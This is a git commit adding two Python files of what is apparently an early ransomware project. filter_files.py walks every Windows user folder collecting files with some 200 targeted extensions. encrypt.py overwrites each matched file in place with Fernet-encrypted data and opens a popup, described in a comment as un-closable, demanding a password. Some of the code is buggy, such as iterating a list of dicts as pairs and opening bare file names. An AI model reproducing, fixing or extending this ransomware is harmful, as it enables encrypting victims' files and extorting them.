97cefd51622b44290887abdf2ebd3872c21ebed7
Rita Alonso Casablancas <78373646+Moca15-ar@users.noreply.github.com>
2022-11-21 05:38:41 +0100

    Add files via upload

---
+++ v2.0.0/encrypt.py
@@ -0,0 +1,47 @@
+from cryptography.fernet import Fernet
+import os
+#----------------------------------------------------------------------
+from generate_key_s import generate_key_symmetric
+from filter_files import useful_paths
+from window import start_window
+
+
+
+# import dictionay of the paths of files to encrypt from filtrate_files
+# import the key
+
+#--------------------------------load key------------------------------
+def load_key():
+    return open('key_symmetric.key', 'rb').read() #open the key in read binary mode and then read it
+
+#--------------------------------encryption------------------------------
+
+def encrypt(paths_dic, key): # (files to encypt, key )
+    fer = Fernet(key)  # using fernet method
+
+    for path, files in paths_dic:  #select variables from the dictionary on filter_files
+        for item in files:   # for every item on the directory
+            with open(item, 'rb') as file:  # having opened the file in read binary mode,
+                file_data = file.read() # save the data of the file in the variable
+            encrypted_data = fer.encrypt(file_data)  #encrypt the variable
+            with open(item, 'wb') as file:  # then having the file opened anew in write binary mode,
+                file.write(encrypted_data)  # write the same data but encrypted
+
+
+
+if __name__=='__main__': #when this program is directly executed
+
+    generate_key_symmetric()  #import from generate_key_s.py
+    key = load_key()
+
+    encrypt(useful_paths, key)  #import from filter_files
+
+
+    
+start_window() #initialize a py file with tkinter a popup window that can't be closed asking for the password
+
+
+
+
+
+
---
+++ v2.0.0/filter_files.py
@@ -0,0 +1,61 @@
+import os
+import glob
+#------------------------------------------------------------------------
+from get_usrs import get_users
+
+# GETS ALL THE FILES THAT WILL BE ENCRYPTED
+
+# now with the user dir from get_usrs function iterate the folders to find all files with certain extentions
+
+# here must import the user names(folders) from the file get_usrs
+
+global all_paths
+all_paths = {} #define dictionary to store every path with its respective files
+
+def find_files(name):
+
+    for path, directories_found, files_found in os.walk(name):
+        #print(path)
+        #print(directories_found)
+        #print(files_found)
+        files=[]
+        extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd',
+        '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg',
+        '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm',
+        '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti',
+        '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak',
+        '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm',
+        '.tif', '.tiff', 'nef', '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv',
+        '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh',
+        '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs',
+        '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd',
+        '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6',
+        '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc',
+        '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr',
+        '.crt', '.key', '.pfx', '.der']
+        # keep only the files with specifyed extensions
+        for f in files_found:
+            #for x in glob.glob():
+            if os.path.splitext(f)[1] in extensions:    # os.path.splitext --> separates a path from the extension of the file, 
+                                                        # creates a 2-element list: [path_and_filename, file_extension], so the [1] selects the element 1, to say the extension.
+                files.append(f)
+        #print(files)
+        all_paths[path] = files # save the values in a dictionary all_paths={path; [list of files in the path]}
+
+    # print(all_paths)
+
+# C:\\Users\\RitaAlonsoCasablanca\\Desktop\\2 BATX A
+# C:\\Users\\RitaAlonsoCasablanca\\Desktop\\malware\\ransomware_versions_test\\test_files
+
+# find_files("C:\\Users")
+u = get_users()
+# One filtering for each user
+for person in u: #users is a var from get_usrs file
+    userpath = 'C:\\Users' + '\\' + person
+    find_files(userpath)
+
+a = [all_paths]
+# print(a)
+
+useful_paths = [ele for ele in ({key: val for key, val in sub.items() if val} for sub in a) if ele] # delete empty values from dic
+# print(useful_paths)
